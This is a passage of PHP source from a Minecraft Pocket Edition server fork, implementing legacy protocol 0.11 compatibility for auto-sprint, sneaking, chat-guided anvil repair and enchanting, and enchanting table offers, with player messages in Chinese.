			return $this->isSneaking();
		}

		$enabled = !$this->isSneaking();
		$ev = new PlayerToggleSneakEvent($this, $enabled);
		$this->server->getPluginManager()->callEvent($ev);
		if($ev->isCancelled()){
			$this->sendData($this);
			return $this->isSneaking();
		}

		$this->setSneaking($enabled);
		return $enabled;
	}

	private function applyProtocol011AutoSprint() : void{
		if(!$this->isProtocol011Player() or !$this->protocol011AutoSprint){
			return;
		}

		if(!$this->isSprinting()){
			$this->setSprinting(true);
		}
		$this->syncDepthStriderMovementSpeed();
		$this->syncProtocol011AutoSprintClientSpeed();
	}

	private function sendProtocol011AutoSprintJoinMessage() : void{
		if(!$this->isProtocol011Player()){
			return;
		}

		if($this->protocol011AutoSprint){
			$this->sendMessage("§a您当前为自动疾跑模式，输入/sprint即可关闭自动疾跑");
		}else{
			$this->sendMessage("§a您当前已关闭自动疾跑模式，输入/sprint即可开启自动疾跑");
		}
	}

	private function sendProtocol011SneakJoinMessage() : void{
		if(!$this->isProtocol011Player() or !$this->isOp()){
			return;
		}

		$this->sendMessage("§6输入/sneak即可切换蹲下状态");
	}

	private function isProtocol015Player() : bool{
		return ProtocolCompatibility::isProtocol015((int) $this->protocol);
	}

	private function isProtocol012Player() : bool{
		return ProtocolCompatibility::isProtocol012((int) $this->protocol);
	}

	private function isProtocol011Player() : bool{
		return ProtocolCompatibility::isProtocol011((int) $this->protocol);
	}

	public function handleProtocol011AnvilInteraction(Block $anvilBlock, Item $hand) : bool{
		if(!$this->isProtocol011Player()){
			return false;
		}

		$this->expireProtocol011AnvilSession();
		$now = time();
		$this->legacy011AnvilSession["time"] = $now;
		$this->legacy011AnvilSession["block"] = $anvilBlock;

		if($hand->getId() === Item::AIR or $hand->getCount() <= 0){
			$this->sendProtocol011AnvilHelp();
			$this->resetProtocol011AnvilSession();
			return true;
		}

		if(($this->legacy011AnvilSession["stage"] ?? "") === "book" and ($this->legacy011AnvilSession["book"] ?? null) instanceof Item){
			return $this->applyProtocol011AnvilBook($anvilBlock, $hand, $this->legacy011AnvilSession["book"]);
		}

		if(($this->legacy011AnvilSession["stage"] ?? "") === "repair" and ($this->legacy011AnvilSession["material"] ?? null) instanceof Item){
			$materialSlot = (int) ($this->legacy011AnvilSession["materialSlot"] ?? -1);
			$targetSlot = $this->inventory->getHeldItemSlot();
			if($targetSlot === $materialSlot){
				$this->sendMessage("§7[§4✖§7] §c请切换到另一格要修复的物品，不能用同一件物品当材料。");
				$this->resetProtocol011AnvilSession();
				return true;
			}

			$repair = $this->tryProtocol011AnvilRepair($this->legacy011AnvilSession["material"], $hand);
			if($repair === null){
				$this->sendMessage("§7[§4✖§7] §c材料不匹配，或物品耐久已满。");
				$this->resetProtocol011AnvilSession();
				return true;
			}
			$handled = $this->finishProtocol011AnvilRepair($anvilBlock, $this->legacy011AnvilSession["material"], $hand, $repair, $materialSlot);
			if($handled){
				$this->tryProtocol011DamageAnvil($anvilBlock);
			}
			return $handled;
		}

		if($hand->getId() === Item::ENCHANTED_BOOK){
			if(!$hand->hasEnchantments()){
				$this->sendMessage("§7[§4✖§7] §c无效的附魔书。");
				$this->resetProtocol011AnvilSession();
				return true;
			}

			$this->legacy011AnvilSession = [
				"stage" => "book",
				"book" => clone $hand,
				"block" => $anvilBlock,
				"time" => $now
			];
			$this->sendMessage("§7[§a✔§7]§a 请手持要附魔的物品点击以确认操作");
			return true;
		}

		$targetName = $this->getProtocol011RepairTargetName($hand);
		if($targetName === null){
			$this->sendProtocol011AnvilHelp();
			return true;
		}

		$this->legacy011AnvilSession = [
			"stage" => "repair",
			"material" => clone $hand,
			"materialSlot" => $this->inventory->getHeldItemSlot(),
			"block" => $anvilBlock,
			"time" => $now
		];
		$this->sendMessage("§7[§a✔§7]§a 请手持要修复的§e " . $targetName . " §a并再次点击。");
		return true;
	}

	public function handleProtocol011EnchantingTableInteraction(Block $tableBlock, Item $hand) : bool{
		if(!$this->isProtocol011Player()){
			return false;
		}

		$this->expireProtocol011EnchantingTableSession();
		$category = $this->getProtocol011EnchantingTableCategory($hand);
		if($category === null){
			$this->sendMessage("§7[§4✖§7] §c您手持的物品无法被附魔！（必须手持工具、盔甲、武器、书）");
			$this->resetProtocol011EnchantingTableSession();
			return true;
		}

		if(($this->legacy011EnchantingTableSession["stage"] ?? "") === "offer"){
			$offer = $this->legacy011EnchantingTableSession;
			if(($offer["category"] ?? "") !== $category or (int) ($offer["itemId"] ?? -1) !== $hand->getId()){
				$this->sendMessage("§7[§4✖§7] §c附魔过程中不能更换物品类型！");
				$this->resetProtocol011EnchantingTableSession();
				return true;
			}
			if($hand->getId() !== Item::BOOK and $hand->hasEnchantments()){
				$this->sendMessage("§7[§4✖§7] §c附魔过的物品无法再被附魔！");
				$this->resetProtocol011EnchantingTableSession();
				return true;
			}

			$enchantment = Enchantment::getEnchantment((int) $offer["enchantment"]);
			$enchantment->setLevel((int) $offer["level"]);
			if(!$this->canProtocol011ApplyEnchantment($hand, $enchantment) and $hand->getId() !== Item::BOOK){
				$this->sendMessage("§7[§4✖§7] §c此物品无法被附魔。");
				$this->resetProtocol011EnchantingTableSession();
				return true;
			}

			$lapis = Item::get(Item::DYE, Dye::BLUE, (int) $offer["lapis"]);
			if(!$this->inventory->contains($lapis)){
				$this->sendMessage("§7[§4✖§7] §c你的背包中没有足够的 青金石*" . $lapis->getCount() . " 或 exp等级*" . (int) $offer["cost"]);
				$this->resetProtocol011EnchantingTableSession();
				return true;
			}
			if($this->getExpLevel() < (int) $offer["cost"]){
				$this->sendMessage("§7[§4✖§7] §c你的背包中没有足够的 青金石*" . $lapis->getCount() . " 或 exp等级*" . (int) $offer["cost"]);
				$this->resetProtocol011EnchantingTableSession();
				return true;
			}

			$this->inventory->removeItem($lapis);
			$this->setExpLevel($this->getExpLevel() - (int) $offer["cost"]);
			if($hand->getId() === Item::BOOK){
				$this->inventory->removeItem(Item::get(Item::BOOK, 0, 1));
				$result = Item::get(Item::ENCHANTED_BOOK, 0, 1);
				$result->addEnchantment($enchantment);
				foreach($this->inventory->addItem($result) as $leftover){
					$this->level->dropItem($this, $leftover);
				}
				$this->sendMessage("§7[§a✔§7]§a 成功从附魔台获取了" . $this->getProtocol011EnchantmentDisplayName($enchantment->getId()) . " 附魔书！");
			}else{
				$result = clone $hand;
				$result->addEnchantment($enchantment);
				$this->inventory->setItemInHand($result);
				$this->sendMessage("§7[§a✔§7]§a 成功附魔 " . $this->getProtocol011EnchantmentDisplayName($enchantment->getId()) . " " . $this->getProtocol011EnchantmentLevelName($enchantment->getLevel()) . "！");
			}
			$this->inventory->sendContents($this);
			$this->resetProtocol011EnchantingTableSession();
			return true;
		}

		if($hand->getId() !== Item::BOOK and $hand->hasEnchantments()){
			$this->sendMessage("§7[§4✖§7] §c附魔过的物品无法再被附魔！");
			$this->resetProtocol011EnchantingTableSession();
			return true;
		}

		$available = $this->getProtocol011AvailableEnchantments($category);
		$available = array_values(array_filter($available, function($id) use ($hand){
			$enchantment = Enchantment::getEnchantment((int) $id);
			return $hand->getId() === Item::BOOK or $this->canProtocol011ApplyEnchantment($hand, $enchantment);
		}));
		if(count($available) === 0){
			$this->sendMessage("§7[§4✖§7] §c您手持的物品无法被附魔！（必须手持工具、盔甲、武器、书）");
			$this->resetProtocol011EnchantingTableSession();
			return true;
		}

		$enchantmentId = (int) $available[mt_rand(0, count($available) - 1)];
		$level = mt_rand(1, min(3, Enchantment::getEnchantMaxLevel($enchantmentId)));
		$cost = $level;
		$lapis = $level * 5;
		$this->legacy011EnchantingTableSession = [
			"stage" => "offer",
			"category" => $category,
			"itemId" => $hand->getId(),
			"enchantment" => $enchantmentId,
			"level" => $level,
			"cost" => $cost,
			"lapis" => $lapis,
			"block" => $tableBlock,
			"time" => time()
		];
		$this->sendMessage("§a您的附魔类型：§e" . $this->getProtocol011EnchantmentDisplayName($enchantmentId) . " " . $this->getProtocol011EnchantmentLevelName($level));
		$this->sendMessage("§a所需条件：§e青金石*" . $lapis . ", 等级*" . $cost);
		$this->sendMessage("§a再次点击即可附魔");
		return true;
	}

	private function expireProtocol011AnvilSession() : void{
		if(isset($this->legacy011AnvilSession["time"]) and time() - (int) $this->legacy011AnvilSession["time"] > 30){
			$this->resetProtocol011AnvilSession();
		}
	}

	private function resetProtocol011AnvilSession() : void{
		$this->legacy011AnvilSession = [];
	}

	private function sendProtocol011AnvilHelp() : void{
		$this->sendMessage("§e======= §f铁砧使用说明 §e=======");
		$this->sendMessage("§7[§a1§7] §d手持 §b材料 §d点击 §f§l»§r §a修复手持物品");
		$this->sendMessage("§7[§a2§7] §d手持 §b附魔书 §d点击 §f§l»§r §a给手持的物品附魔");
	}

	private function applyProtocol011AnvilBook(Block $anvilBlock, Item $target, Item $book) : bool{
		if(!$this->canProtocol011UseAsEnchantTarget($target)){
			$this->sendMessage("§7[§4✖§7] §c此物品无法被附魔。");
			$this->resetProtocol011AnvilSession();
			return true;
		}

		$result = clone $target;
		$applied = [];
		foreach($this->getProtocol011BookEnchantments($book) as $bookEnchantment){
			$enchantment = $this->resolveProtocol011AnvilEnchantment($result, $bookEnchantment);
			if($enchantment instanceof Enchantment){
				$result->addEnchantment($enchantment);
				$applied[] = $enchantment;
			}
		}

		if(count($applied) === 0){
			$this->sendMessage("§7[§4✖§7] §c这本书的附魔无法应用到此物品。");
			$this->resetProtocol011AnvilSession();
			return true;
		}

		$cost = 0;
		foreach($applied as $enchantment){
			$cost += max(1, $this->getProtocol011BookCostMultiplier($enchantment->getId())) * $enchantment->getLevel();
		}
		if($this->getExpLevel() < $cost){
			$this->sendMessage("§7[§4✖§7] §c你需要§e " . $cost . "§c 经验等级，你只有 §e" . $this->getExpLevel() . "§c。");
			$this->resetProtocol011AnvilSession();
			return true;
		}

		$bookToRemove = Item::get(Item::ENCHANTED_BOOK, 0, 1);
		if($book->hasCompoundTag()){
			$bookToRemove->setCompoundTag($book->getCompoundTag());
		}
		if(!$this->inventory->contains($bookToRemove)){
			$this->sendMessage("§7[§4✖§7] §c未找到附魔书，操作失败。");
			$this->resetProtocol011AnvilSession();
			return true;
		}

		$this->inventory->removeItem($bookToRemove);
		$this->setExpLevel($this->getExpLevel() - $cost);
		$this->inventory->setItemInHand($result);
		$this->inventory->sendContents($this);
		$this->playProtocol011AnvilUseSound($anvilBlock);
		$this->tryProtocol011DamageAnvil($anvilBlock);
		$this->sendMessage("§7[§a✔§7]§a 附魔成功！消耗了§e " . $cost . " §a经验等级。");
		$this->resetProtocol011AnvilSession();
		return true;
	}

	private function getProtocol011BookEnchantments(Item $book) : array{
		$result = [];
		foreach($book->getEnchantments() as $enchantment){
			$maxLevel = Enchantment::getEnchantMaxLevel($enchantment->getId());
			if($enchantment->getId() !== Enchantment::TYPE_INVALID and $enchantment->getLevel() <= $maxLevel){
				$result[] = clone $enchantment;
			}
		}

		return $result;
	}

	private function resolveProtocol011AnvilEnchantment(Item $target, Enchantment $bookEnchantment){
		if(!$this->canProtocol011ApplyEnchantment($target, $bookEnchantment)){
			return null;
		}
		foreach($target->getEnchantments() as $existing){
			if($existing->getId() !== $bookEnchantment->getId() and $this->isProtocol011ConflictingEnchantment($existing->getId(), $bookEnchantment->getId())){
				return null;
			}
		}

		$maxLevel = Enchantment::getEnchantMaxLevel($bookEnchantment->getId());
		$bookLevel = min($bookEnchantment->getLevel(), $maxLevel);
		$oldLevel = $target->getEnchantmentLevel($bookEnchantment->getId());
		$newLevel = $oldLevel > 0 ? ($oldLevel === $bookLevel ? min($maxLevel, $oldLevel + 1) : max($oldLevel, $bookLevel)) : $bookLevel;
		if($newLevel <= $oldLevel){
			return null;
		}

		return Enchantment::getEnchantment($bookEnchantment->getId())->setLevel($newLevel);
	}

	private function finishProtocol011AnvilRepair(Block $anvilBlock, Item $material, Item $target, array $repair, int $materialSlot) : bool{
		$cost = (int) $repair["xp_cost"];
		if($this->getExpLevel() < $cost){
			$this->sendMessage("§7[§4✖§7] §c你需要§e " . $cost . "§c 经验等级，你只有 §e" . $this->getExpLevel() . "§c。");
			$this->resetProtocol011AnvilSession();
			return true;
		}

		$materialToRemove = $repair["is_combine_repair"] ? clone $material : Item::get($material->getId(), $material->getDamage(), (int) $repair["need"]);
		if(!$this->consumeProtocol011AnvilMaterialFromSlot($materialSlot, $materialToRemove)){
			$this->sendMessage("§7[§4✖§7] §c材料不足：需要§e " . (int) $repair["need"] . " §c个。");
			$this->resetProtocol011AnvilSession();
			return true;
		}

		$this->setExpLevel($this->getExpLevel() - $cost);
		$this->inventory->setItemInHand($repair["item"]);
		$this->inventory->sendContents($this);
		$this->playProtocol011AnvilUseSound($anvilBlock);
		if($repair["is_combine_repair"]){
			$this->sendMessage("§7[§a✔§7]§a 合并修复成功！");
			$this->sendMessage("§7[§e?§7] §f消耗经验: §e" . $cost . "§f级。");
		}else{
			$this->sendMessage("§7[§a✔§7]§a 修复成功！消耗了§e " . $cost . " §a经验等级和§e " . (int) $repair["need"] . " §a个材料。");
		}
		$this->resetProtocol011AnvilSession();
		return true;
	}

	private function consumeProtocol011AnvilMaterialFromSlot(int $slot, Item $materialToRemove) : bool{
		if($slot < 0 or $slot >= $this->inventory->getSize()){
			return false;
		}

		$slotItem = $this->inventory->getItem($slot);
		$checkDamage = $materialToRemove->getDamage() === null ? false : true;
		$checkTags = $materialToRemove->getCompoundTag() === null ? false : true;
		if(!$materialToRemove->equals($slotItem, $checkDamage, $checkTags) or $slotItem->getCount() < $materialToRemove->getCount()){
			return false;
		}

		$remaining = clone $slotItem;
		$remaining->setCount($remaining->getCount() - $materialToRemove->getCount());
		return $this->inventory->setItem($slot, $remaining);
	}

	private function tryProtocol011AnvilRepair(Item $material, Item $target){
		if(!$this->canProtocol011UseAsEnchantTarget($target) or $target->getCount() !== 1){
			return null;
		}

		if($material->getId() === $target->getId() and $material->getCount() >= 1){
			$result = clone $target;
			$changed = false;
			$cost = 0;
			$maxDurability = $target->getMaxDurability();
			if($maxDurability !== false and $maxDurability > 0){
				$targetRemaining = max(0, $maxDurability - $target->getDamage());
				$materialRemaining = max(0, $maxDurability - $material->getDamage());
				$combinedRemaining = min($maxDurability, $targetRemaining + $materialRemaining + (int) floor($maxDurability * 0.12));
				$newDamage = $maxDurability - $combinedRemaining;
				if($newDamage < $result->getDamage()){
					$result->setDamage($newDamage);
					$changed = true;
					$cost += 2;
				}
			}

			foreach($material->getEnchantments() as $materialEnchantment){
				$enchantment = $this->resolveProtocol011AnvilEnchantment($result, $materialEnchantment);
				if($enchantment instanceof Enchantment){
					$result->addEnchantment($enchantment);
					$changed = true;
					$cost += max(1, $this->getProtocol011BookCostMultiplier($enchantment->getId())) * $enchantment->getLevel();
				}
			}

			if(!$changed or $cost <= 0){
				return null;
			}

			return [
				"item" => $result,
				"need" => 1,
				"xp_cost" => $cost,
				"is_combine_repair" => true
			];
		}

		$repairMaterial = $this->getProtocol011RepairMaterialId($target);
		if($repairMaterial === false or $material->getId() !== $repairMaterial){
			return null;
		}
		$maxDurability = $target->getMaxDurability();
		if($maxDurability === false or $maxDurability <= 0 or $target->getDamage() <= 0){
			return null;
		}

		$damage = min($maxDurability, max(0, $target->getDamage()));
		$repairPerUnit = max(1, (int) floor($maxDurability / 4));
		$used = 0;
		while($damage > 0 and $used < $material->getCount()){
			$damage -= min($repairPerUnit, $damage);
			++$used;
		}
		if($used <= 0 or $damage >= $target->getDamage()){
			return null;
		}

		$result = clone $target;
		$result->setDamage($damage);
		return [
			"item" => $result,
			"need" => $used,
			"xp_cost" => $used,
			"is_combine_repair" => false
		];
	}

	private function getProtocol011RepairTargetName(Item $material){
		if($material->getMaxDurability() !== false and $material->getMaxDurability() > 0){
			return "相同物品";
		}

		switch($material->getId()){
			case Item::DIAMOND:
				return "钻石装备或工具";
			case Item::IRON_INGOT:
				return "铁质装备、锁链护甲、剪刀或打火石";
			case Item::GOLD_INGOT:
				return "金质装备或工具";
			case Item::COBBLESTONE:
				return "石质工具";
			case Item::PLANK:
				return "木质工具";
			case Item::LEATHER:
				return "皮革护甲";
			case Item::STRING:
				return "弓或钓鱼竿";
		}

		return null;
	}

	private function getProtocol011RepairMaterialId(Item $target){
		if($target->isArmor()){
			switch($target->getArmorTier()){
				case Armor::TIER_LEATHER:
					return Item::LEATHER;
				case Armor::TIER_CHAIN:
				case Armor::TIER_IRON:
					return Item::IRON_INGOT;
				case Armor::TIER_DIAMOND:
					return Item::DIAMOND;
				case Armor::TIER_GOLD:
					return Item::GOLD_INGOT;
			}
		}

		$tier = $this->getProtocol011ToolTier($target);
		if($tier !== false){
			switch($tier){
				case Tool::TIER_WOODEN:
					return Item::PLANK;
				case Tool::TIER_STONE:
					return Item::COBBLESTONE;
				case Tool::TIER_IRON:
					return Item::IRON_INGOT;
				case Tool::TIER_DIAMOND:
					return Item::DIAMOND;
				case Tool::TIER_GOLD:
					return Item::GOLD_INGOT;
			}
		}

		switch($target->getId()){
			case Item::BOW:
			case Item::FISHING_ROD:
				return Item::STRING;
			case Item::SHEARS:
			case Item::FLINT_STEEL:
				return Item::IRON_INGOT;
		}

		return false;
	}

	private function getProtocol011ToolTier(Item $target){
		if(($tier = $target->isPickaxe()) !== false){
			return $tier;
		}
		if(($tier = $target->isAxe()) !== false){
			return $tier;
		}
		if(($tier = $target->isSword()) !== false){
			return $tier;
		}
		if(($tier = $target->isShovel()) !== false){
			return $tier;
		}
		if(($tier = $target->isHoe()) !== false){
			return $tier;
		}

		return false;
	}

	private function canProtocol011UseAsEnchantTarget(Item $target) : bool{
		if($target->getId() === Item::AIR or $target->getId() === Item::BOOK){
			return false;
		}
		if($target->getId() === Item::ENCHANTED_BOOK){
			return true;
		}
		if($target->isArmor()){
			return true;
		}
		if($target->isSword() !== false or $target->isAxe() !== false or $target->isPickaxe() !== false or $target->isShovel() !== false or $target->isHoe() !== false or $target->isShears() !== false){
			return true;
		}

		return $target->getId() === Item::BOW or $target->getId() === Item::FISHING_ROD or $target->getId() === Item::FLINT_STEEL;
	}

	private function canProtocol011ApplyEnchantment(Item $item, Enchantment $enchantment) : bool{
		if($item->getId() === Item::BOOK or $item->getId() === Item::ENCHANTED_BOOK){
			return true;
		}

		switch($enchantment->getId()){
			case Enchantment::TYPE_ARMOR_PROTECTION:
			case Enchantment::TYPE_ARMOR_FIRE_PROTECTION:
			case Enchantment::TYPE_ARMOR_EXPLOSION_PROTECTION:
			case Enchantment::TYPE_ARMOR_PROJECTILE_PROTECTION:
			case Enchantment::TYPE_ARMOR_THORNS:
				return $item->isArmor();
			case Enchantment::TYPE_ARMOR_FALL_PROTECTION:
			case Enchantment::TYPE_WATER_SPEED:
				return $item->isBoots();
			case Enchantment::TYPE_WATER_BREATHING:
			case Enchantment::TYPE_WATER_AFFINITY:
				return $item->isHelmet();
			case Enchantment::TYPE_WEAPON_SHARPNESS:
			case Enchantment::TYPE_WEAPON_SMITE:
			case Enchantment::TYPE_WEAPON_ARTHROPODS:
				return $item->isSword() !== false or $item->isAxe() !== false;
			case Enchantment::TYPE_WEAPON_KNOCKBACK:
			case Enchantment::TYPE_WEAPON_FIRE_ASPECT:
			case Enchantment::TYPE_WEAPON_LOOTING:
				return $item->isSword() !== false;
			case Enchantment::TYPE_MINING_EFFICIENCY:
			case Enchantment::TYPE_MINING_SILK_TOUCH:
			case Enchantment::TYPE_MINING_FORTUNE:
				return $this->isProtocol011MiningEnchantTarget($item);
			case Enchantment::TYPE_MINING_DURABILITY:
				return $this->canProtocol011UseAsEnchantTarget($item);
			case Enchantment::TYPE_BOW_POWER:
			case Enchantment::TYPE_BOW_KNOCKBACK:
			case Enchantment::TYPE_BOW_FLAME:
			case Enchantment::TYPE_BOW_INFINITY:
				return $item->getId() === Item::BOW;
			case Enchantment::TYPE_FISHING_FORTUNE:
			case Enchantment::TYPE_FISHING_LURE:
				return $item->getId() === Item::FISHING_ROD;
		}

		return false;
	}

	private function isProtocol011MiningEnchantTarget(Item $item) : bool{
		return $item->isPickaxe() !== false or $item->isAxe() !== false or $item->isShovel() !== false or $item->isHoe() !== false or $item->isShears() !== false;
	}

	private function isProtocol011ConflictingEnchantment(int $firstId, int $secondId) : bool{
		if($firstId === $secondId){
			return false;
		}
		$protections = [
			Enchantment::TYPE_ARMOR_PROTECTION => true,
			Enchantment::TYPE_ARMOR_FIRE_PROTECTION => true,
			Enchantment::TYPE_ARMOR_EXPLOSION_PROTECTION => true,
			Enchantment::TYPE_ARMOR_PROJECTILE_PROTECTION => true
		];
		if(isset($protections[$firstId]) and isset($protections[$secondId])){
			return true;
		}

		$damage = [
			Enchantment::TYPE_WEAPON_SHARPNESS => true,
			Enchantment::TYPE_WEAPON_SMITE => true,
			Enchantment::TYPE_WEAPON_ARTHROPODS => true
		];
		if(isset($damage[$firstId]) and isset($damage[$secondId])){
			return true;
		}

		return ($firstId === Enchantment::TYPE_MINING_SILK_TOUCH and $secondId === Enchantment::TYPE_MINING_FORTUNE) or
			($firstId === Enchantment::TYPE_MINING_FORTUNE and $secondId === Enchantment::TYPE_MINING_SILK_TOUCH);
	}

	private function getProtocol011BookCostMultiplier(int $enchantmentId) : int{
		switch($enchantmentId){
			case Enchantment::TYPE_ARMOR_EXPLOSION_PROTECTION:
			case Enchantment::TYPE_WATER_BREATHING:
			case Enchantment::TYPE_WATER_SPEED:
			case Enchantment::TYPE_WATER_AFFINITY:
			case Enchantment::TYPE_WEAPON_FIRE_ASPECT:
			case Enchantment::TYPE_WEAPON_LOOTING:
			case Enchantment::TYPE_MINING_FORTUNE:
			case Enchantment::TYPE_BOW_KNOCKBACK:
			case Enchantment::TYPE_BOW_FLAME:
			case Enchantment::TYPE_FISHING_FORTUNE:
			case Enchantment::TYPE_FISHING_LURE:
				return 2;
			case Enchantment::TYPE_ARMOR_THORNS:
			case Enchantment::TYPE_MINING_SILK_TOUCH:
			case Enchantment::TYPE_BOW_INFINITY:
				return 4;
		}

		return 1;
	}

	private function tryProtocol011DamageAnvil(Block $anvilBlock) : void{
		if($anvilBlock->getId() !== Block::ANVIL or $anvilBlock->getLevel() === null or mt_rand(1, 100) > 15){
			return;
		}

		$oldMeta = (int) $anvilBlock->getDamage();
		$damage = $oldMeta >> 2;
		if($damage >= 2){
			$anvilBlock->getLevel()->setBlock($anvilBlock, Block::get(Block::AIR), true, true);
			$anvilBlock->getLevel()->dropItem($anvilBlock->add(0.5, 0.5, 0.5), Item::get(Item::IRON_INGOT, 0, 3));
			$anvilBlock->getLevel()->addSound(new AnvilBreakSound($anvilBlock));
			return;
		}

		$newMeta = (($damage + 1) << 2) | ($oldMeta & 0x03);
		$anvilBlock->getLevel()->setBlock($anvilBlock, Block::get(Block::ANVIL, $newMeta), true, true);
	}

	private function playProtocol011AnvilUseSound(Block $anvilBlock) : void{
		if($anvilBlock->getLevel() !== null){
			$anvilBlock->getLevel()->addSound(new AnvilUseSound($anvilBlock));
		}
	}

	private function expireProtocol011EnchantingTableSession() : void{
		if(isset($this->legacy011EnchantingTableSession["time"]) and time() - (int) $this->legacy011EnchantingTableSession["time"] > 30){
			$this->resetProtocol011EnchantingTableSession();
		}
	}

	private function resetProtocol011EnchantingTableSession() : void{
		$this->legacy011EnchantingTableSession = [];
	}

	private function getProtocol011EnchantingTableCategory(Item $item){
		if($item->getId() === Item::BOOK){
			return "book";
		}
		if($item->isHelmet()){
			return "helmet";
		}
		if($item->isBoots()){
			return "boots";
		}
		if($item->isArmor()){
			return "armor";
		}
		if($item->isSword() !== false){
			return "sword";
		}
		if($this->isProtocol011MiningEnchantTarget($item) or $item->getId() === Item::FLINT_STEEL){
			return "tool";
		}
		if($item->getId() === Item::BOW){
			return "bow";
		}
		if($item->getId() === Item::FISHING_ROD){
			return "fishing";
		}

		return null;
	}

	private function getProtocol011AvailableEnchantments(string $category) : array{
		$armor = [
			Enchantment::TYPE_ARMOR_PROTECTION,
			Enchantment::TYPE_ARMOR_FIRE_PROTECTION,
			Enchantment::TYPE_ARMOR_EXPLOSION_PROTECTION,
			Enchantment::TYPE_ARMOR_PROJECTILE_PROTECTION,
			Enchantment::TYPE_ARMOR_THORNS
		];
		$helmet = [Enchantment::TYPE_WATER_BREATHING, Enchantment::TYPE_WATER_AFFINITY];
		$boots = [Enchantment::TYPE_ARMOR_FALL_PROTECTION, Enchantment::TYPE_WATER_SPEED];
		$sword = [
			Enchantment::TYPE_WEAPON_SHARPNESS,
			Enchantment::TYPE_WEAPON_SMITE,
			Enchantment::TYPE_WEAPON_ARTHROPODS,
			Enchantment::TYPE_WEAPON_KNOCKBACK,
			Enchantment::TYPE_WEAPON_FIRE_ASPECT,
			Enchantment::TYPE_WEAPON_LOOTING,
			Enchantment::TYPE_MINING_DURABILITY
		];
		$tool = [
			Enchantment::TYPE_MINING_EFFICIENCY,
			Enchantment::TYPE_MINING_SILK_TOUCH,
			Enchantment::TYPE_MINING_DURABILITY,
			Enchantment::TYPE_MINING_FORTUNE
		];
		$bow = [
			Enchantment::TYPE_BOW_POWER,
			Enchantment::TYPE_BOW_KNOCKBACK,
			Enchantment::TYPE_BOW_FLAME,
			Enchantment::TYPE_BOW_INFINITY,
			Enchantment::TYPE_MINING_DURABILITY
		];
		$fishing = [
			Enchantment::TYPE_FISHING_FORTUNE,
			Enchantment::TYPE_FISHING_LURE,
			Enchantment::TYPE_MINING_DURABILITY
		];

		switch($category){
			case "helmet":
				return array_merge($armor, $helmet);
			case "boots":
				return array_merge($armor, $boots);
			case "armor":
				return $armor;
			case "sword":
				return $sword;
			case "tool":
				return $tool;
			case "bow":
				return $bow;
			case "fishing":
				return $fishing;
			case "book":
				return array_values(array_unique(array_merge($armor, $helmet, $boots, $sword, $tool, $bow, $fishing)));
		}

		return [];
	}

	private function getProtocol011EnchantmentDisplayName(int $id) : string{
		$names = [
			Enchantment::TYPE_ARMOR_PROTECTION => "保护",
			Enchantment::TYPE_ARMOR_FIRE_PROTECTION => "火焰保护",
			Enchantment::TYPE_ARMOR_FALL_PROTECTION => "摔落保护",
			Enchantment::TYPE_ARMOR_EXPLOSION_PROTECTION => "爆炸保护",
			Enchantment::TYPE_ARMOR_PROJECTILE_PROTECTION => "弹射物保护",
			Enchantment::TYPE_ARMOR_THORNS => "荆棘",
			Enchantment::TYPE_WATER_BREATHING => "水下呼吸",
			Enchantment::TYPE_WATER_SPEED => "深海探索者",
			Enchantment::TYPE_WATER_AFFINITY => "水下速掘",
			Enchantment::TYPE_WEAPON_SHARPNESS => "锋利",
			Enchantment::TYPE_WEAPON_SMITE => "亡灵杀手",
			Enchantment::TYPE_WEAPON_ARTHROPODS => "节肢杀手",
			Enchantment::TYPE_WEAPON_KNOCKBACK => "击退",
			Enchantment::TYPE_WEAPON_FIRE_ASPECT => "火焰附加",
			Enchantment::TYPE_WEAPON_LOOTING => "抢夺",
			Enchantment::TYPE_MINING_EFFICIENCY => "效率",
			Enchantment::TYPE_MINING_SILK_TOUCH => "精准采集",
			Enchantment::TYPE_MINING_DURABILITY => "耐久",
			Enchantment::TYPE_MINING_FORTUNE => "时运",
			Enchantment::TYPE_BOW_POWER => "力量",
			Enchantment::TYPE_BOW_KNOCKBACK => "冲击",
			Enchantment::TYPE_BOW_FLAME => "火矢",
			Enchantment::TYPE_BOW_INFINITY => "无限",
			Enchantment::TYPE_FISHING_FORTUNE => "海之眷顾",
			Enchantment::TYPE_FISHING_LURE => "饵钓"
		];

		return $names[$id] ?? ("未知附魔");
	}

	private function getProtocol011EnchantmentLevelName(int $level) : string{
		$names = [
			1 => "I",
			2 => "II",
			3 => "III",
			4 => "IV",
			5 => "V"
		];

		return $names[$level] ?? (string) $level;
	}

	private function shouldDropProtocol012ArrowTakeItemEntityPacket($packet) : bool{
		if(!$this->isProtocol012Player() or (!($packet instanceof TakeItemEntityPacket) and !($packet instanceof TakeItemEntityPacketV84)) or $this->level === null){
			return false;
		}

		return $this->level->getEntity((int) $packet->target) instanceof Arrow;
	}

	public function markProtocol011CraftingTableOpen(int $craftingType) : void{
		$this->craftingType = $craftingType;
		if($this->isProtocol011Player()){
			$this->legacy011CraftingType = $craftingType;
		}
	}

	private function resetProtocol011CraftingTableState() : void{
		$this->legacy011CraftingType = 0;
	}

	private function getProtocol011CraftingType() : int{
		return $this->isProtocol011Player() ? max($this->craftingType, $this->legacy011CraftingType) : $this->craftingType;
	}

	private function getAdventureSettingsFlags(bool $forceSpectator = false) : int{
		$flags = 0;
		if($forceSpectator or $this->isAdventure()){
			$flags |= 0x01;
		}

		if($this->autoJump){
			$flags |= 0x40;
		}

		if($forceSpectator or $this->allowFlight){
			$flags |= 0x80;
		}

		if($forceSpectator or $this->isSpectator()){
			$flags |= 0x100;
		}

		return $flags;
	}

	private function sendProtocol011Health() : void{
		if(!$this->isProtocol011Player() or $this->spawned !== true){
			return;
		}

		$pk = new SetHealthPacketV11();
		$pk->health = $this->getHealth();
		$this->dataPacketProtocol011($pk->setChannel(Network::CHANNEL_WORLD_EVENTS));
	}

	private function getProtocol015Property(string $name, $default){
		return isset($this->server) && method_exists($this->server, "getProperty") ? $this->server->getProperty($name, $default) : $default;
	}

	private function getLegacy011ExperienceProgress() : float{
		$levelUp = max(1, (int) $this->getLevelUpExpectedExperience());
		$currentBase = (int) $this->server->getExpectedExperience($this->expLevel);
		$currentExp = max(0, (int) ($this->exp - $currentBase));

		return max(0, min(1, $currentExp / $levelUp));
	}

	private function sendLegacy011StatusTip(int $currentTick) : void{
		if(!$this->isProtocol011Player() or !$this->spawned or !$this->isAlive()){
			return;
		}

		if($this->legacy011StatusTipNextTick <= 0){
			$this->legacy011StatusTipNextTick = $currentTick;
		}

		if($currentTick >= $this->legacy011StatusTipNextTick){
			$this->legacy011StatusTipUntilTick = $currentTick + (20 * 2);
			$this->legacy011StatusTipNextTick = $currentTick + (20 * 10);
		}

